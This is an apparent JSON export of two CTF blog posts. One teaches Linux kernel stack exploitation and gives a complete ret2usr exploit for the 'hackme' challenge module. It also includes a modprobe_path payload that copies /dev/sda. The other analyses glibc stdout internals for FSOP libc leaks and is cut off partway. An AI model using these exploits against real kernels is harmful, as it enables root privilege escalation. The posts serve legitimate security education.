[{"title":"Stack-based exploits in Linux kernel","url":"/2024/01/29/stack-linux-kernel/","content":"# Stack-based exploits in Linux kernel\n\n## Mitigations\n### 1. SMEP\n- dont allow to execute user space code\n- in qemu, to enable SMEP we use `-cpu+smep`  to disasble it use `-append nosmep`\n- SMEP is a hardware security mechanism. Setting the 21st bit of the CR4 register enables SMEP.\n\n### 2. SMAP\n\n- kernel space cannot read or write userspace memory\n- to do that we need to use copy_from_user / copy_to_user\n\n### 3. Kernel Canary\n\n- the same as stack canary on user land\n- enabled in the kernel at compile time and cannot be disabled.\n\n### 4. KASLR\n\n- randomizes the base address where the kernel is loaded each time the system is booted\n- It can be enabled/disabled by adding `kaslr` or `nokaslr` under `-append` option.\n\n### 5. KPTI (Kernel Page-Table Isolation)\n\n- prevent Meltdown (side-channel attack)\n\n### 6. KADR (Kernel Address Display Restriction)\n\n- hide kernel address /proc/kallsyms\n- `/proc/sys/kernel/kptr_restrict` : 0 to disable it\n\nKernel have sus function : `run_cmd(char * cmd)` : run cmd in userspace as root.\n\n## Stack-base technique\n### 1. ret2usr\nThis exploit take advantage of kernel space process can see userspace process → execute code in userspace with kernel permission (root) \n\n#### Requirements :\n\n- SMEP must be off\n- overflow must be possible\n- ability to leak ( at least canary)\n\n#### Ideas:\n\nOverwrite return address of a kernel process to the process we can control in user space\n\n##### Steps:\n\n- save register state (`cs ,ss ,rsp,rflags`) in user space\n- escalate privilege before return to user space (`commit_creds(prepare_kernel_cred(0))` )\n- Return to user mode from kernel mode in kernel space + restore register state\n- get shell\n\n#### Details\n\n##### Save registers state\n\nThe process keep track of 2 different states of register in kernel and user mode. Because we want to execute `system('/bin/sh')` in user mode so we need to restore user mode’s state \n\nThese states should not random so before an access to kernel space process it must save states.\n\n```c\nunsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;\nvoid save_state(){\n    __asm__(\n        \".intel_syntax noprefix;\"\n        \"mov user_cs, cs;\"\n        \"mov user_ss, ss;\"\n        \"mov user_sp, rsp;\"\n        \"pushf;\"\n        \"pop user_rflags;\"\n        \".att_syntax;\"\n    );\n    puts(\"[*] Saved state\");\n}\n```\n\n##### Escalate privilege + switch to user mode + restore states\n\nTo escalate privilege, we simply use `commit_creds(prepare_kernel_cred(0))`\n\nTo switch to user mode, to process must use 1 of these : \n\n- `sysretq` : complicated to setup\n- `iretq` : commonly use\n\n`iretq`  require stack to setup with **5 userland register values** in this order: `RIP|CS|RFLAGS|SP|SS` → the value we save earlier\n\n- for rip, we need to set it to the `get_shell()` address to get shell\n\nOn x86/64, `swapgs`  instruction must be call before `iretq`\n\nFinally, we just push the save state register to stack\n\n```c\nunsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;\nvoid leo_quyen()\n{\n\t__asm__(\n\t\".intel_syntax noprefix;\"\n\t\"movabs rax, 0xffffffff814c67f0;\"\n\t\"xor rdi, rdi;\"\n\t\"call rax;\"\n\t\"mov rdi,rax;\"\n\t\"movabs rax,0xffffffff814c6410;\"\n\t\"call rax;\"\n\t\"swapgs;\"\n    \"mov r15, user_ss;\"\n    \"push r15;\"\n    \"mov r15, user_sp;\"\n    \"push r15;\"\n    \"mov r15, user_rflags;\"\n    \"push r15;\"\n    \"mov r15, user_cs;\"\n    \"push r15;\"\n    \"mov r15, user_rip;\"\n    \"push r15;\"\n    \"iretq;\"\n\t\".att_syntax;\"\n\t\t);\n}\n```\n### 2. Bypass SMEP/SMAP\nSMEP mitigation is similar to NX in userland. SMEP enable by enable the 20th bit of CR4 register (start from 0) \n\n![image](https://hackmd.io/_uploads/SJow9EH9p.png)\n\n\n#### a. Overwrite CR4 register\n\nThere is an api in kernel  `native_write_cr4(value)` \n\n→ ROPchain : pop rdi → `native_write_cr4()` → `prepare_kernel_cred()` → ….\n\nWe do that by zero out the 20th bit of CR4 register.\n\nBut in newer version of kernel , CR4 register cannot be change after boot by using pin. → If we change, it will set to the default boot value\n\n#### b. ROPchain\n\nBecause we can’t execute code in user space , we can use gadget in kernel space. \n\nNote that these gadgets from ROPgadget not always works because it don’t known that memory area is executable or not → try and error\nAlso work with SMAP enable\n\n##### Can overwrite more that return address\n\nJust build a normal ROP chain to call `prepare_kernel_cred()`…\n\n##### Can overwrite only return address (stack pivot)\n\nFind a gadget that can mov some value to `rsp` , ex : *`mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret`*\n\nIn user space we mmap a region to build ROP chain.\n\nThis is possible due to SMAP is disable.\n\n```basic\nvoid build_fake_stack(void){\n    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|M, -1, 0);\n    unsigned off = 0x1000 / 8;\n    fake_stack[0] = 0xdead; // put something in the first page to prevent fault\n    fake_stack[off++] = 0x0; // dummy r12\n    fake_stack[off++] = 0x0; // dummy rbp\n    fake_stack[off++] = pop_rdi_ret;\n    ... // the rest of the chain is the same as the last payload\n}\n```\n\nNot work with SMAP\n\n### 3. KPTI trampoline (KPTI bypass)\n#### Bypass\n2 way to bypass:\n- using signal handler in userland\n    `signal(SIGSEGV, get_shell)`\n- KPTI trampoline\n#### KPTI trampoline\n\nkernel have a function : `swapgs_restore_regs_and_return_to_usermode()` to swap kernel page to user page\n\nit will restore by pop a lots of regs in stack → ret2 `swapgs_restore_regs_and_return_to_usermode + 22`\n\n![Untitledc77a1695b3efbfd4.png](https://img.upanh.tv/2024/01/29/Untitledc77a1695b3efbfd4.png)\n\n\n`modprobe` is store under `modprobe_path` symbol in the linux kernel\n\nIt will invoke when these function is call in userland :\n\n- system()\n- execve()\n- …\n\nWhen we call `system(’/tmp/cc’)` and file signature of `cc` is unknown it will call `modprobe` \nTherefore, we have arbitrary command execution.\nNote that we don’t need to use `commit_creds(prepare_kernel_cred(0))` → shorter ROP\n\n### 4. modprobe_path\n- Exploit kernel vuln to archive ROP in kernel space\n- Find gadget to overwrite `modprobe_path`  in to new_path. Ex : `/tmp/cc`\n- Return to user space\n- Now we create that file in user space\n    ```c\n    system(\"echo '#!/bin/sh\\ncp /dev/sda /tmp/flag\\nchmod 777 /tmp/flag' > /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n    ```\n- Run that file\n    ```c\n    puts(\"[*] Run unknown file\");\n    system(\"/tmp/dummy\");\n    ```\n    \n## Debug + DEMO\n### 1. Debug\nFirst we need to set our kernel to have root → ez to debug (by extract cpio file\nSecond, remove some mitigations (typically in run.sh script provided by the challenge) → reads kernel symbol easier\n\nInside the qemu script add: \n\n```bash\n-gdb tcp::1234\n```\n\nWrite a [pack.sh](http://pack.sh) script :\n\n```bash\n#!/bin/sh\ngcc -o exp -static exp.c\nmv ./exp ./root\ncd ./root\nfind . -print0 \\\n| cpio -o --format=newc  --null --owner=root  \\\n| gzip -9 > initramfs.cpio.gz\nmv ./initramfs.cpio.gz ../\n```\n\n- `exp.c` is the exploit i write in C.\n- `./root` is the folder contain file system extract by the provided `initramfs.cpio.gz`\n\nI also write a python script to automate the process of packing and running the kernel + debug\n```python\nfrom pwn import *\nimport os \n\ndef debug():\n\tcommand = f\"\"\"target remote 127.0.0.1:1234\nc\nksymaddr-remote-apply\nc\n\t\"\"\"\n\tinit = f\"\"\"#!/usr/bin/python3\nimport os\nos.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', '-x', '/tmp/QEMU_debug.gdb'], os.environ)\n\t\"\"\"\n\twith open('/tmp/run_GDB','wt') as f:\n\t\tf.write(init)\n\twith open('/tmp/QEMU_debug.gdb', 'wt') as f:\n\t\tf.write(command)\n\tos.chmod(\"/tmp/run_GDB\",stat.S_IRWXU)\n\tos.chmod(\"/tmp/QEMU_debug.gdb\",stat.S_IRWXU)\n\tif (args.GDB):\n\t\tdebug_process = process(['cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '-d', '.', 'wsl.exe', '-d', 'Ubuntu', 'bash', '-c', '/tmp/run_GDB'])\n\ndef start():\n\tos.system(\"./pack.sh\")\n\tdebug()\n\tos.system(\"./run.sh\")\n\nif __name__==\"__main__\": \n\tstart()\n```\n\n### 2. Demo ret2usr\n[Challenge](https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xz)\n\nwe need to modify the run.sh script\n```bash\n#!/bin/sh\nqemu-system-x86_64 \\\n    -m 128M \\\n    -cpu kvm64\\\n    -kernel vmlinuz \\\n    -initrd initramfs.cpio.gz \\\n    -snapshot \\\n    -nographic \\\n    -monitor /dev/null \\\n    -no-reboot \\\n    -append \"console=ttyS0 nopti nokaslr quiet panic=1\" \\\n    -gdb tcp::1234\n```\nWe can read the stack freely on `hackme_read`\n\n![Screenshot 2024-01-29 204256](https://hackmd.io/_uploads/ryiEcEr9p.png)\nAnd stack buffer overflow on `hackme_write`\n\n![Screenshot 2024-01-29 203824](https://hackmd.io/_uploads/rkTbcEB9p.png)\n\n\nBase on this we can see the device name is `hackme`\n![Screenshot 2024-01-29 204829](https://hackmd.io/_uploads/S1yX9NH9a.png)\n\n\n\nFirst we need to open the device\n\n```clike\nvoid open_dev()\n{\n\tdevice_fd = open(device_name,O_RDWR);\n\tif (device_fd < 0)\n\t{\n\t\tputs(\"[!] Cannot open device...\\nExiting...\");\n\t\texit(-1);\n\t} else \n\t\tputs(\"[*] Opened device\");\n}\n```\n\nTo do ret2usr we must able to ROP -> leak canary\n\n```clike\nvoid leak_canary()\n{\n\tunsigned long long leak[4] = {};\n\tread(device_fd,leak,sizeof(leak));\n\tcanary = leak[2];\n\tprintf(\"[*] CANARY : 0x%llx\\n\",canary);\n}\n\n```\n\nNow we set breakpoint at \n![Screenshot 2024-01-29 205206](https://hackmd.io/_uploads/HJhtc4Hqp.png)\n\n![Screenshot 2024-01-29 205351](https://hackmd.io/_uploads/H1Sc54B96.png)\n\n\nIt copy the what store at rsi to rdi with len 0x20\n\n![Screenshot 2024-01-29 210119](https://hackmd.io/_uploads/SJTiKErqa.png)\n\nAt offset 2 is canary\n![image](https://hackmd.io/_uploads/HklcF4rqT.png)\n\n\nNow we can just find the offset to overflow the save rip in `hackme_write`\nNote that smep is off so we can freely run userspace code in kernel space\n\n```clike\nvoid leo_quyen()\n{\n\t__asm__(\n\t\".intel_syntax noprefix;\"\n\t\"movabs rax, 0xffffffff814c67f0;\"\n\t\"xor rdi, rdi;\"\n\t\"call rax;\"\n\t\"mov rdi,rax;\"\n\t\"movabs rax,0xffffffff814c6410;\"\n\t\"call rax;\"\n\t\"swapgs;\"\n    \"mov r15, user_ss;\"\n    \"push r15;\"\n    \"mov r15, user_sp;\"\n    \"push r15;\"\n    \"mov r15, user_rflags;\"\n    \"push r15;\"\n    \"mov r15, user_cs;\"\n    \"push r15;\"\n    \"mov r15, user_rip;\"\n    \"push r15;\"\n    \"iretq;\"\n\t\".att_syntax;\"\n\t\t);\n}\n\nvoid overwrite()\n{\n\tunsigned long long payload[21] = {};\n\tfor (int i =0;i<=15;i++)\n\t\tpayload[i] = 0x6161616161616161;\n\tpayload[16] = canary ;\n\tpayload[17] = 0;\n\tpayload[18] = 0;\n\tpayload[19] = 0;\n\tpayload[20] = (unsigned long long )leo_quyen+8;\n\tif (write(device_fd,payload,sizeof(payload)) <0)\n\t{\n\t\tputs(\"[!] Cannot write to device...\\nExiting...\");\n\t\texit(-1);\n\t}\n\telse\n\t\tputs(\"[*] Write successfully\");\n\n}\n```\nBefore run that code we need to save registers state\n```clike\nvoid save_state()\n{\n\t__asm__(\n    \".intel_syntax noprefix;\"\n    \"mov user_cs, cs;\"\n    \"mov user_ss, ss;\"\n    \"mov user_sp, rsp;\"\n    \"pushf;\"\n    \"pop user_rflags;\"\n    \".att_syntax;\"\n    );\n    puts(\"[*] Saved state\");\n}\n```\n\nBefore overflow\n![Screenshot 2024-01-29 211949](https://hackmd.io/_uploads/HJbNFEH9T.png)\n\n\nAfter overflow\n![Screenshot 2024-01-29 212119](https://hackmd.io/_uploads/rJMXKVB9T.png)\n\n\n\n- Final exp:\n```clike\n#include <stdio.h>\n#include <fcntl.h>\n#include <stdlib.h>\n\n#define device_name \"/dev/hackme\"\n#define commit_creds 0xffffffffc000016a\n#define prepare_kernel_cred 0xffffffff814c67f0\n\nint device_fd ;\nunsigned long long canary;\n\nvoid open_dev()\n{\n\tdevice_fd = open(device_name,O_RDWR);\n\tif (device_fd < 0)\n\t{\n\t\tputs(\"[!] Cannot open device...\\nExiting...\");\n\t\texit(-1);\n\t} else \n\t\tputs(\"[*] Opened device\");\n}\n\n\nvoid leak_canary()\n{\n\tunsigned long long leak[4] = {};\n\tread(device_fd,leak,sizeof(leak));\n\tcanary = leak[2];\n\tprintf(\"[*] CANARY : 0x%llx\\n\",canary);\n}\n\nvoid get_shell()\n{\n\tif (getuid()==0)\n\t{\n\t\tputs(\"[!] Become ROOT\");\n\t\tsystem(\"/bin/sh\");\n\t}else\n\t{\t\n\t\tputs(\"[*] Something wrong\");\n\t\texit;\n\t}\n}\n\nunsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;\nvoid leo_quyen()\n{\n\t__asm__(\n\t\".intel_syntax noprefix;\"\n\t\"movabs rax, 0xffffffff814c67f0;\"\n\t\"xor rdi, rdi;\"\n\t\"call rax;\"\n\t\"mov rdi,rax;\"\n\t\"movabs rax,0xffffffff814c6410;\"\n\t\"call rax;\"\n\t\"swapgs;\"\n    \"mov r15, user_ss;\"\n    \"push r15;\"\n    \"mov r15, user_sp;\"\n    \"push r15;\"\n    \"mov r15, user_rflags;\"\n    \"push r15;\"\n    \"mov r15, user_cs;\"\n    \"push r15;\"\n    \"mov r15, user_rip;\"\n    \"push r15;\"\n    \"iretq;\"\n\t\".att_syntax;\"\n\t\t);\n}\n\nvoid overwrite()\n{\n\tunsigned long long payload[21] = {};\n\tfor (int i =0;i<=15;i++)\n\t\tpayload[i] = 0x6161616161616161;\n\tpayload[16] = canary ;\n\tpayload[17] = 0;\n\tpayload[18] = 0;\n\tpayload[19] = 0;\n\tpayload[20] = (unsigned long long )leo_quyen+8;\n\tif (write(device_fd,payload,sizeof(payload)) <0)\n\t{\n\t\tputs(\"[!] Cannot write to device...\\nExiting...\");\n\t\texit(-1);\n\t}\n\telse\n\t\tputs(\"[*] Write successfully\");\n\n}\n\nvoid save_state()\n{\n\t__asm__(\n    \".intel_syntax noprefix;\"\n    \"mov user_cs, cs;\"\n    \"mov user_ss, ss;\"\n    \"mov user_sp, rsp;\"\n    \"pushf;\"\n    \"pop user_rflags;\"\n    \".att_syntax;\"\n    );\n    puts(\"[*] Saved state\");\n}\nint main()\n{\n\tsave_state();\n\topen_dev();\n\tleak_canary();\n\toverwrite();\n\treturn 0 ;\n}\n```\n\n## References:\n- https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/\n- https://github.com/pr0cf5/kernel-exploit-practice/tree/master\n- https://github.com/pr0cf5/kernel-exploit-practice/blob/master/bypass-smap/README.md","tags":["linux","kernel"],"categories":["pwn","stack overflow"]},{"title":"FSOP stdout","url":"/2023/10/13/fsop-stdout/","content":"# FSOP stdout\nFSOP stdout\n## Analysis\n\n### 1. fclose\n\n![](https://hackmd.io/_uploads/ry9OZ6LWp.png)\n\n`fclose()` → `__IO_new_fclose`\n\n```c\n#define fclose(fp) _IO_new_fclose (fp)\n```\n\n- src (glibc-2.31)\n    \n    ```c\n    int\n    _IO_new_fclose (FILE *fp)\n    {\n      int status;\n    \n      CHECK_FILE(fp, EOF);\n    \n    #if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)\n      /* We desperately try to help programs which are using streams in a\n         strange way and mix old and new functions.  Detect old streams\n         here.  */\n      if (_IO_vtable_offset (fp) != 0)\n        return _IO_old_fclose (fp);\n    #endif\n    \n      /* First unlink the stream.  */\n      if (fp->_flags & _IO_IS_FILEBUF)\n        _IO_un_link ((struct _IO_FILE_plus *) fp);\n    \n      _IO_acquire_lock (fp);\n      if (fp->_flags & _IO_IS_FILEBUF)\n        status = _IO_file_close_it (fp);\n      else\n        status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;\n      _IO_release_lock (fp);\n      _IO_FINISH (fp);\n      if (fp->_mode > 0)\n        {\n          /* This stream has a wide orientation.  This means we have to free\n    \t the conversion functions.  */\n          struct _IO_codecvt *cc = fp->_codecvt;\n    \n          __libc_lock_lock (__gconv_lock);\n          __gconv_release_step (cc->__cd_in.step);\n          __gconv_release_step (cc->__cd_out.step);\n          __libc_lock_unlock (__gconv_lock);\n        }\n      else\n        {\n          if (_IO_have_backup (fp))\n    \t_IO_free_backup_area (fp);\n        }\n      _IO_deallocate_file (fp);\n      return status;\n    }\n    ```\n    \n\nControl Flow:\n\n1. check `fp` through `CHECK_FILE(fp, EOF);`\n2. if detect old streams (vtable available or not) then call  `_IO_old_fclose` \n3. if _flag  = 0x2000 (_IO_IS_FILEBUF) → call `_IO_un_link`\n4. if _flag  = 0x2000 (_IO_IS_FILEBUF) → call `_IO_file_close_it\n5. call `_IO_FINISH`\n\n### 2. __IO_un_link\n\n- scr (glibc-2.31)\n    \n    ```c\n    void\n    _IO_un_link (struct _IO_FILE_plus *fp)\n    {\n      if (fp->file._flags & _IO_LINKED)\n        {\n          FILE **f;\n    #ifdef _IO_MTSAFE_IO\n          _IO_cleanup_region_start_noarg (flush_cleanup);\n          _IO_lock_lock (list_all_lock);\n          run_fp = (FILE *) fp;\n          _IO_flockfile ((FILE *) fp);\n    #endif\n          if (_IO_list_all == NULL)\n    \t;\n          else if (fp == _IO_list_all)\n    \t_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all->file._chain;\n          else\n    \tfor (f = &_IO_list_all->file._chain; *f; f = &(*f)->_chain)\n    \t  if (*f == (FILE *) fp)\n    \t    {\n    \t      *f = fp->file._chain;\n    \t      break;\n    \t    }\n          fp->file._flags &= ~_IO_LINKED;\n    #ifdef _IO_MTSAFE_IO\n          _IO_funlockfile ((FILE *) fp);\n          run_fp = NULL;\n          _IO_lock_unlock (list_all_lock);\n          _IO_cleanup_region_end (0);\n    #endif\n        }\n    }\n    ```\n    \n\nControl Flow:\n\n1. if `_flags = 0x0080` then doing the below stuff\n2. check if `fp == _IO_list_all` → `_IO_list_all` point to the next fp in _chain\n3. loop from the _chain list starting from `_IO_list_all` , if found fp then remove it \n4. mark the _flag to indicate it closed `fp->file._flags &= ~_IO_LINKED`\n\n### 3. ****_IO_file_close_it****\n\n`_IO_file_close_it` →`_IO_new_file_close_it`\n\n- src (glibc-2.31)\n    \n    ```c\n    int\n    _IO_new_file_close_it (FILE *fp)\n    {\n      int write_status;\n      if (!_IO_file_is_open (fp))\n        return EOF;\n    \n      if ((fp->_flags & _IO_NO_WRITES) == 0\n          && (fp->_flags & _IO_CURRENTLY_PUTTING) != 0)\n        write_status = _IO_do_flush (fp);\n      else\n        write_status = 0;\n    \n      _IO_unsave_markers (fp);\n    \n      int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0\n    \t\t      ? _IO_SYSCLOSE (fp) : 0);\n    \n      /* Free buffer. */\n      if (fp->_mode > 0)\n        {\n          if (_IO_have_wbackup (fp))\n    \t_IO_free_wbackup_area (fp);\n          _IO_wsetb (fp, NULL, NULL, 0);\n          _IO_wsetg (fp, NULL, NULL, NULL);\n          _IO_wsetp (fp, NULL, NULL);\n        }\n      _IO_setb (fp, NULL, NULL, 0);\n      _IO_setg (fp, NULL, NULL, NULL);\n      _IO_setp (fp, NULL, NULL);\n    \n      _IO_un_link ((struct _IO_FILE_plus *) fp);\n      fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;\n      fp->_fileno = -1;\n      fp->_offset = _IO_pos_BAD;\n    \n      return close_status ? close_status : write_status;\n    }\n    ```\n    \n\nControl Flow :\n\n1. check if file is open \n2. check if the file is open in write mode\n    - `_IO_NO_WRITES`  (0x0008)\n    - `_IO_CURRENTLY_PUTTING`\n    - if satisfied → call `_IO_do_flush` to flush the buffer and initialize the pointers\n3. check _flags2 == `_IO_FLAGS2_NOCLOSE]`(32) → `_IO_SYSCLOSE` (`__close` in vtable)\n\n### 4. puts\n\n`puts` → `_IO_puts` \n\n- src\n    \n    ```c\n    int\n    _IO_puts (const char *str)\n    {\n      int result = EOF;\n      size_t len = strlen (str);\n      _IO_acquire_lock (stdout);\n    \n      if ((_IO_vtable_offset (stdout) != 0\n           || _IO_fwide (stdout, -1) == -1)\n          && _IO_sputn (stdout, str, len) == len\n          && _IO_putc_unlocked ('\\n', stdout) != EOF)\n        result = MIN (INT_MAX, len + 1);\n    \n      _IO_release_lock (stdout);\n      return result;\n    }\n    ```\n    \n\nNote that in the scr code, it will call  `_IO_sputn` which mean that `__xsputn` from vtable of stdout will be call \n\n```c\n(_IO_FILE_plus)_IO_2_1_stdout→vtable.__xsputn(stdout, str, len)\n```\n\n**`_IO_new_file_xsputn`**\n\n- src\n    \n    ```c\n    size_t\n    _IO_new_file_xsputn (FILE *f, const void *data, size_t n)\n    {\n      const char *s = (const char *) data;\n      size_t to_do = n;\n      int must_flush = 0;\n      size_t count = 0;\n    \n      if (n <= 0)\n        return 0;\n      /* This is an optimized implementation.\n         If the amount to be written straddles a block boundary\n         (or the filebuf is unbuffered), use sys_write directly. */\n    \n      /* First figure out how much space is available in the buffer. */\n      if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))\n        {\n          count = f->_IO_buf_end - f->_IO_write_ptr;\n          if (count >= n)\n    \t{\n    \t  const char *p;\n    \t  for (p = s + n; p > s; )\n    \t    {\n    \t      if (*--p == '\\n')\n    \t\t{\n    \t\t  count = p - s + 1;\n    \t\t  must_flush = 1;\n    \t\t  break;\n    \t\t}\n    \t    }\n    \t}\n        }\n      else if (f->_IO_write_end > f->_IO_write_ptr)\n        count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */\n    \n      /* Then fill the buffer. */\n      if (count > 0)\n        {\n          if (count > to_do)\n    \tcount = to_do;\n          f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);\n          s += count;\n          to_do -= count;\n        }\n      if (to_do + must_flush > 0)\n        {\n          size_t block_size, do_write;\n          /* Next flush the (full) buffer. */\n          if (_IO_OVERFLOW (f, EOF) == EOF)\n    \t/* If nothing else has to be written we must not signal the\n    \t   caller that everything has been written.  */\n    \treturn to_do == 0 ? EOF : n - to_do;\n    \n          /* Try to maintain alignment: write a whole number of blocks.  */\n          block_size = f->_IO_buf_end - f->_IO_buf_base;\n          do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);\n    \n          if (do_write)\n    \t{\n    \t  count = new_do_write (f, s, do_write);\n    \t  to_do -= count;\n    \t  if (count < do_write)\n    \t    return n - to_do;\n    \t}\n    \n          /* Now write out the remainder.  Normally, this will fit in the\n    \t buffer, but it's somewhat messier for line-buffered files,\n    \t so we let _IO_default_xsputn handle the general case. */\n          if (to_do)\n    \tto_do -= _IO_default_xsputn (f, s+do_write, to_do);\n        }\n      return n - to_do;\n    }\n    ```\n    \n\nControl Flow :\n\n1. check available space in the buffer \n2. fill the buffer : `f->_IO_write_ptr` = `__mempcpy (f->_IO_write_ptr)`\n3. if to-do remain `_IO_OVERFLOW` is called\n4. finally call `_IO_default_xsputn` to write \n\n→ we focus on`_IO_OVERFLOW`\n\n  `_IO_new_file_overflow`\n\n- scr\n    \n    ```c\n    int\n    _IO_new_file_overflow (FILE *f, int ch)\n    {\n      if (f->_flags & _IO_NO_WRITES) /* SET ERROR */\n        {\n          f->_flags |= _IO_ERR_SEEN;\n          __set_errno (EBADF);\n          return EOF;\n        }\n      /* If currently reading or no buffer allocated. */\n      if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n        {\n          /* Allocate a buffer if needed. */\n          if (f->_IO_write_base == NULL)\n    \t{\n    \t  _IO_doallocbuf (f);\n    \t  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);\n    \t}\n          /* Otherwise must be currently reading.\n    \t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\n    \t logically slide the buffer forwards one block (by setting the\n    \t read pointers to all point at the beginning of the block).  This\n    \t makes room for subsequent output.\n    \t Otherwise, set the read pointers to _IO_read_end (leaving that\n    \t alone, so it can continue to correspond to the external position). */\n          if (__glibc_unlikely (_IO_in_backup (f)))\n    \t{\n    \t  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;\n    \t  _IO_free_backup_area (f);\n    \t  f->_IO_read_base -= MIN (nbackup,\n    \t\t\t\t   f->_IO_read_base - f->_IO_buf_base);\n    \t  f->_IO_read_ptr = f->_IO_read_base;\n    \t}\n    \n          if (f->_IO_read_ptr == f->_IO_buf_end)\n    \tf->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;\n          f->_IO_write_ptr = f->_IO_read_ptr;\n          f->_IO_write_base = f->_IO_write_ptr;\n          f->_IO_write_end = f->_IO_buf_end;\n          f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;\n    \n          f->_flags |= _IO_CURRENTLY_PUTTING;\n          if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))\n    \tf->_IO_write_end = f->_IO_write_ptr;\n        }\n      if (ch == EOF)\n        return _IO_do_write (f, f->_IO_write_base,\n    \t\t\t f->_IO_write_ptr - f->_IO_write_base);\n      if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */\n        if (_IO_do_flush (f) == EOF)\n          return EOF;\n      *f->_IO_write_ptr++ = ch;\n      if ((f->_flags & _IO_UNBUFFERED)\n          || ((f->_flags & _IO_LINE_BUF) && ch == '\\n'))\n        if (_IO_do_write (f, f->_IO_write_base,\n    \t\t      f->_IO_write_ptr - f->_IO_write_base) == EOF)\n          return EOF;\n      return (unsigned char) ch;\n    }\n    ```\n    \n\nControl Flow:\n\n1. check the file is writable : `if (f->_flags & _IO_NO_WRITES`\n2. checking stuff\n3. finally, if `ch = EOF` call `_IO_do_write`\n    \n    → note `_IO_do_write`\n    \n\n`_IO_do_write` \n\n- src\n    \n    ```c\n    int\n    _IO_new_do_write (FILE *fp, const char *data, size_t to_do)\n    {\n      return (to_do == 0\n              || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;\n    }\n    ```\n    \n\n`new_do_write`\n\n- scr\n    \n    ```c\n    static size_t\n    new_do_write (FILE *fp, const char *data, size_t to_do)\n    {\n      size_t count;\n      if (fp->_flags & _IO_IS_APPENDING)\n        /* On a system without a proper O_APPEND implementation,\n           you would need to sys_seek(0, SEEK_END) here, but is\n           not needed nor desirable for Unix- or Posix-like systems.\n           Instead, just indicate that offset (before and after) is\n           unpredictable. */\n        fp->_offset = _IO_pos_BAD;\n      else if (fp->_IO_read_end != fp->_IO_write_base)\n        {\n          off64_t new_pos\n    \t= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);\n          if (new_pos == _IO_pos_BAD)\n    \treturn 0;\n          fp->_offset = new_pos;\n        }\n      count = _IO_SYSWRITE (fp, data, to_do);\n      if (fp->_cur_column && count)\n        fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;\n      _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);\n      fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;\n      fp->_IO_write_end = (fp->_mode <= 0\n    \t\t       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))\n    \t\t       ? fp->_IO_buf_base : fp->_IO_buf_end);\n      return count;\n    }\n    ```\n    \n\nIt will call `_IO_SYSWRITE` in our exploit, it is a leak.\n\n## Techniques\n\n### 1.  hijack vtable\n\noverwrite vtable and put appropriate address that we want to call in the vtable struct\n\n### 2. leak libc\n\n<aside>\n💡 Fake _flags and _IO_write_base then a function using stdout (puts,printf) call after , we will get the libc address\n\n</aside>\n\n![](https://hackmd.io/_uploads/BJ-1VTIW6.png)\n\n**Analysis :**\n\n- __flags have 4 bytes\n    - first 2 byte is `_IO_MAGIC` (`0xFBAD0000`)\n    - the rest is flags\n    - all flags\n        \n        ```c\n        /* Magic number and bits for the _flags field.  The magic number is\n           mostly vestigial, but preserved for compatibility.  It occupies the\n           high 16 bits of _flags; the low 16 bits are actual flag bits.  */\n        #define _IO_MAGIC         0xFBAD0000 /* Magic number */\n        #define _IO_MAGIC_MASK    0xFFFF0000\n        #define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */\n        #define _IO_UNBUFFERED        0x0002\n        #define _IO_NO_READS          0x0004 /* Reading not allowed.  */\n        #define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */\n        #define _IO_EOF_SEEN          0x0010\n        #define _IO_ERR_SEEN          0x0020\n        #define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */\n        #define _IO_LINKED            0x0080 /* In the list of all open files.  */\n        #define _IO_IN_BACKUP         0x0100\n        #define _IO_LINE_BUF          0x0200\n        #define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */\n        #define _IO_CURRENTLY_PUTTING 0x0800\n        #define _IO_IS_APPENDING      0x1000\n        #define _IO_IS_FILEBUF        0x2000\n                                   /* 0x4000  No longer used, reserved for compat.  */\n        #define _IO_USER_LOCK         0x8000\n        ```\n        \n    \n    → we need to note `_IO_CURRENTLY_PUTTING` (0x800) and `_IO_IS_APPENDING` (0x1000)\n    \n- From the vtable, we need to note:\n    - __overflow\n    - __xsputn\n    - 